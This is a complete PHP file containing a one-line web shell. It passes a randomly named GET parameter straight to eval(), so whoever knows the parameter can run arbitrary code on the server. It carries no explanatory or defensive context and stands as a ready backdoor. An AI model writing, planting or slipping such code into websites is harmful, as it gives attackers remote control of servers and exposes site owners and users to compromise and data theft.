<?php
eval($_GET[’qBEFFKmA']);
?>
